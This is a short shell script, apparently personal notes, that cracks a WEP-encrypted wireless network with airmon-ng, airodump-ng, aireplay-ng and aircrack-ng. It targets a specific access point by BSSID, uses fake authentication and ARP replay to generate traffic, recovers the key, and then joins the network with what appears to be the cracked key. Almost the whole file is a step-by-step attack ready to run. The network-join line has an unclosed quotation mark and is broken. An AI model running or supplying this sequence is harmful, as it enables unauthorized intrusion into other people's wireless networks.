#!/bin/sh

# wep open

# 1 -  create monitor mode interface
airmon-ng start wlan0

# 2 - start airodump-ng to scan for networks
airodump-ng mon0

# 3 - capture packets on specific channel and the bssid ( mac address of AP) and write to file
airodump-ng --channel 11 mon0 --write corrib --bssid 00:1F:33:F0:53:45

# 4 - do a fake auth with the AP
aireplay-ng -1 0 -a 00:1F:33:F0:53:45 mon0

# 5 - aireplay-ng
aireplay-ng -3 -b 00:1F:33:F0:53:45 mon0

# 6 - aircrack-ng
aircrack-ng corrib-01.cap

#-----------------------------------------------#

# put the ethernet down so you dont connect from the host machine
ifconfig eth0 down

# connect to the network
iwconfig wlan0 essid "Your Network key 30:39:38:38:37

# get a dhcp address on wlan0
dhclient wlan0


# ping google.com
ping google.com

# check ip address
curl -s "http://v4.ipv6-test.com/api/myip.php"


#-----------------------------------------------#

# put the eth0 interface back up
ifconfig eth0 up

# get a dhcp address on eth0
dhclient eth0